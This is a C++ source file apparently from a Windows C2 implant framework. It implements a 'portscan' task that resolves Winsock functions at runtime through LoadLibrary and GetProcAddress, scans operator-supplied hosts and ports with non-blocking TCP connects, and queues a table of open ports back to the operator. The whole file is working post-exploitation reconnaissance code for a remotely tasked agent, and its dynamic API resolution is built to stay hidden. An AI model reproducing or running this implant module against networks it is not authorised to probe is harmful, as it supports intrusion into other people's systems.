#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PORTSCAN

using namespace stardust;
using namespace starburst;

// Winsock constants
constexpr int AF_INET_        = 2;
constexpr int SOCK_STREAM_    = 1;
constexpr int IPPROTO_TCP_    = 6;
constexpr long FIONBIO_       = 0x8004667E;
constexpr int WSAEWOULDBLOCK_ = 10035;

typedef struct {
    short          sin_family;
    unsigned short sin_port;
    unsigned long  sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN_;

typedef struct {
    unsigned int fd_count;
    uintptr_t    fd_array[64];
} FD_SET_;

typedef struct {
    long tv_sec;
    long tv_usec;
} TIMEVAL_;

typedef struct {
    uint16_t wVersion;
    uint16_t wHighVersion;
    char     szDescription[257];
    char     szSystemStatus[129];
    uint16_t iMaxSockets;
    uint16_t iMaxUdpDg;
    char*    lpVendorInfo;
} WSADATA_;

// function pointer typedefs
typedef int       ( WINAPI *fn_WSAStartup    )( uint16_t, WSADATA_* );
typedef uintptr_t ( WINAPI *fn_socket        )( int, int, int );
typedef int       ( WINAPI *fn_connect       )( uintptr_t, void*, int );
typedef int       ( WINAPI *fn_closesocket   )( uintptr_t );
typedef int       ( WINAPI *fn_ioctlsocket   )( uintptr_t, long, unsigned long* );
typedef int       ( WINAPI *fn_select        )( int, FD_SET_*, FD_SET_*, FD_SET_*, TIMEVAL_* );
typedef int       ( WINAPI *fn_WSACleanup    )( void );
typedef unsigned long ( WINAPI *fn_inet_addr )( const char* );
typedef unsigned short ( WINAPI *fn_htons    )( unsigned short );
typedef int       ( WINAPI *fn_WSAGetLastError )( void );

static auto declfn parse_port( const char* str, uint32_t len ) -> uint16_t {
    uint16_t val = 0;
    for ( uint32_t i = 0; i < len; i++ ) {
        if ( str[i] < '0' || str[i] > '9' ) break;
        val = val * 10 + ( str[i] - '0' );
    }
    return val;
}

auto declfn starburst::cmd_portscan(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // parse arguments
    uint32_t hosts_len = 0;
    auto hosts_str = parser_string( params, &hosts_len );
    if ( !hosts_str || hosts_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hosts provided" ) ) );
        return;
    }

    uint32_t ports_len = 0;
    auto ports_str = parser_string( params, &ports_len );
    if ( !ports_str || ports_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no ports provided" ) ) );
        return;
    }

    uint32_t timeout_ms = parser_int32( params );
    if ( timeout_ms == 0 ) timeout_ms = 1000;

    // copy parsed strings to stack buffers
    char hosts_buf[1024] = { 0 };
    uint32_t hcopy = hosts_len < 1023 ? hosts_len : 1023;
    memory::copy( hosts_buf, hosts_str, hcopy );
    hosts_buf[hcopy] = '\0';

    char ports_buf[512] = { 0 };
    uint32_t pcopy = ports_len < 511 ? ports_len : 511;
    memory::copy( ports_buf, ports_str, pcopy );
    ports_buf[pcopy] = '\0';

    // load ws2_32.dll
    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "ws2_32.dll" ) ) );
    if ( !h_ws2 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary ws2_32 failed" ) ) );
        return;
    }

    // resolve winsock functions
    auto pWSAStartup     = reinterpret_cast<fn_WSAStartup>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "WSAStartup" ) ) );
    auto pSocket         = reinterpret_cast<fn_socket>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "socket" ) ) );
    auto pConnect        = reinterpret_cast<fn_connect>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "connect" ) ) );
    auto pClosesocket    = reinterpret_cast<fn_closesocket>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "closesocket" ) ) );
    auto pIoctlsocket    = reinterpret_cast<fn_ioctlsocket>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "ioctlsocket" ) ) );
    auto pSelect         = reinterpret_cast<fn_select>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "select" ) ) );
    auto pWSACleanup     = reinterpret_cast<fn_WSACleanup>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "WSACleanup" ) ) );
    auto pInetAddr       = reinterpret_cast<fn_inet_addr>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "inet_addr" ) ) );
    auto pHtons          = reinterpret_cast<fn_htons>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "htons" ) ) );
    auto pWSAGetLastError = reinterpret_cast<fn_WSAGetLastError>(
        inst.kernel32.GetProcAddress( h_ws2, symbol<LPCSTR>( "WSAGetLastError" ) ) );

    if ( !pWSAStartup || !pSocket || !pConnect || !pClosesocket ||
         !pIoctlsocket || !pSelect || !pWSACleanup || !pInetAddr ||
         !pHtons || !pWSAGetLastError ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve winsock functions" ) ) );
        return;
    }

    WSADATA_ wsa_data;
    memory::zero( &wsa_data, sizeof(wsa_data) );
    if ( pWSAStartup( 0x0202, &wsa_data ) != 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "WSAStartup failed" ) ) );
        return;
    }

    // parse hosts (split on comma, max 32)
    char* host_list[32] = { 0 };
    uint32_t host_count = 0;
    {
        char* p = hosts_buf;
        host_list[host_count++] = p;
        while ( *p && host_count < 32 ) {
            if ( *p == ',' ) {
                *p = '\0';
                p++;
                // skip whitespace
                while ( *p == ' ' ) p++;
                host_list[host_count++] = p;
            } else {
                p++;
            }
        }
    }

    // parse ports (split on comma, max 64)
    uint16_t port_list[64] = { 0 };
    uint32_t port_count = 0;
    {
        char* p = ports_buf;
        char* start = p;
        while ( *p && port_count < 64 ) {
            if ( *p == ',' ) {
                *p = '\0';
                port_list[port_count++] = parse_port( start, (uint32_t)( p - start ) );
                p++;
                while ( *p == ' ' ) p++;
                start = p;
            } else {
                p++;
            }
        }
        // last port
        if ( start != p && port_count < 64 ) {
            port_list[port_count++] = parse_port( start, (uint32_t)( p - start ) );
        }
    }

    // allocate output buffer
    uint32_t out_cap = 16384;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pWSACleanup();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    str_copy( output, symbol<char*>( const_cast<char*>(
        "Host\tPort\tStatus\n" ) ) );
    uint32_t off = str_len( output );
    uint32_t open_count = 0;

    // scan
    for ( uint32_t h = 0; h < host_count; h++ ) {
        unsigned long addr = pInetAddr( host_list[h] );
        if ( addr == 0xFFFFFFFF ) continue;

        for ( uint32_t p = 0; p < port_count; p++ ) {
            if ( port_list[p] == 0 ) continue;

            uintptr_t sock = pSocket( AF_INET_, SOCK_STREAM_, IPPROTO_TCP_ );
            if ( sock == (uintptr_t)(~0) ) continue;

            // set non-blocking
            unsigned long mode = 1;
            pIoctlsocket( sock, FIONBIO_, &mode );

            SOCKADDR_IN_ sa;
            memory::zero( &sa, sizeof(sa) );
            sa.sin_family = (short)AF_INET_;
            sa.sin_port   = pHtons( port_list[p] );
            sa.sin_addr   = addr;

            pConnect( sock, &sa, sizeof(sa) );

            // use select to wait for connection
            FD_SET_ write_set;
            memory::zero( &write_set, sizeof(write_set) );
            write_set.fd_count = 1;
            write_set.fd_array[0] = sock;

            FD_SET_ except_set;
            memory::zero( &except_set, sizeof(except_set) );
            except_set.fd_count = 1;
            except_set.fd_array[0] = sock;

            TIMEVAL_ tv;
            tv.tv_sec  = timeout_ms / 1000;
            tv.tv_usec = ( timeout_ms % 1000 ) * 1000;

            int sel_ret = pSelect( 0, nullptr, &write_set, &except_set, &tv );

            bool is_open = false;
            if ( sel_ret > 0 && write_set.fd_count > 0 ) {
                // check if socket is actually in the write set
                bool in_write = false;
                for ( unsigned int f = 0; f < write_set.fd_count; f++ ) {
                    if ( write_set.fd_array[f] == sock ) { in_write = true; break; }
                }
                // check socket is NOT in except set
                bool in_except = false;
                for ( unsigned int f = 0; f < except_set.fd_count; f++ ) {
                    if ( except_set.fd_array[f] == sock ) { in_except = true; break; }
                }
                if ( in_write && !in_except ) is_open = true;
            }

            pClosesocket( sock );

            if ( is_open && off + 128 < out_cap ) {
                open_count++;

                // host
                uint32_t hlen = str_len( host_list[h] );
                memory::copy( output + off, host_list[h], hlen );
                off += hlen;
                output[off++] = '\t';

                // port
                char num[8];
                int_to_str( num, port_list[p], 10 );
                uint32_t nlen = str_len( num );
                memory::copy( output + off, num, nlen );
                off += nlen;
                output[off++] = '\t';

                // status
                str_copy( output + off, symbol<char*>( const_cast<char*>( "open" ) ) );
                off += 4;

                output[off++] = '\n';
            }
        }
    }

    output[off] = '\0';

    pWSACleanup();

    if ( open_count == 0 ) {
        inst.heap_free( output );
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "No open ports found" ) ) );
        return;
    }

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
